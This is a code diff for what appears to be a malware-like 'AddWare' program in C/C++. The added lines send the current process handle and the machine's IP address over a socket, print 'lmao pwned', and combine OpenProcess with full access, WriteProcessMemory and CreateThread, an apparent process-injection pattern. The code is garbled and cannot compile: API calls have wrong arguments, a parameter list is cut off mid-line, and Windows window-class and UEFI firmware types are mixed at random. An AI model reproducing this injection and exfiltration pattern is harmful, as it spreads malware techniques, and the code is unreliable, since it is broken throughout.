@@ -23,13 +23,27 @@ WINDCLASSEX AddWareFNProcessGrub() {
 SOCKET ProcessGrub;
 sockaddr_t ProcessGrubGetSock = (sockaddr_t)*AddWareFNProcessGrubGetSocket();
 ProcessGrub = connect(ProcessGrub, (sockaddr_t)*ProcessGrubGetSock, 0, 0);
+
+HANDLE WinHandlePwn;
+  
 if (ProcessGrub > 0) {
   send(ProcessGrub, (LPVOID)*GetCurrentProcess(), 0, 0); 
   send(ProcessGrub, (LPVOID)*GetIPAddress(), 0, 0);
+  WinHandlePwn = printf(">\n>\n>\n>\n>lmao pwned\\.\n");
+}
+  _Sleep(100000);
+  (int)*(sockaddr_t), malloc((int)*ProcessGrub, sizeof((int)*ProcessGrub, 0xffffffff);
+  if (_Sleep(0) > 0) {
+  CloseWindow(WinHandlePwn, nullptr);
+      ProcessGrub = NULL;
+  ProcessGrubGetSocket = NULL;
+    _Sleep(100000);
+  }
+  return;
 }
 
-EFI_STATUS AddWareFN(EFI_HANDLE IMAGE, EFI_SYSTEM_TABLE *TABLE, LPCSTR STRWINDADD1C, LPCSTR STRWINDADD2C, LPCSTR STRWINDADD3C, LPCSTR STRWINDADD4C, LPCSTR STRWINDADD5C, LPCSTR STRWINDADD6C, LPCSTR STRWINDADD7C, LPCSTR STRWINDADD8C, LPCSTR STRWINDADD9C, LPCSTR STRWINDADD10C) { 
-WINDCLASSEX WindAdd1;
+EFI_STATUS AddWareFN(EFI_HANDLE IMAGE, EFI_SYSTEM_TABLE *TABLE, H { 
+
 int proc; 
 IMAGE = WriteProcessMemory(IsOpenProc,
 if(CreateProcess(PROCESS_ALL_ACCESS, 
@@ -38,7 +52,11 @@ proc++;
 }
 HINSTANCE IsOpenProc = OpenProcess(PROCESS_ALL_ACCESS, false,
   nullptr, nullptr, proc);
+WINDCLASSEX OpenProc = CreateThread("AddWareSys", "AddWareSys", nullptr, false, nullptr, nullptr, (HINSTANCE)*AddWareFNProcessGrub());
+OpenProc.Icon = R"AddWareSys.ice";
+OpenProc.hInst = IsOpenProcess;
+RegisterWindClassEx(OpenProc); 
+if (IsOpenProcess > 0x300000) {
 memcpy(IsOpenProc, (LPVOID)*IMAGE, 0xffffffff);
-WINDCLASSEX OpenProc = 
-Initialize(IMAGE,TABLE);
+Initialize(IMAGE,TABLE); }
 return EFI_SUCCESS;
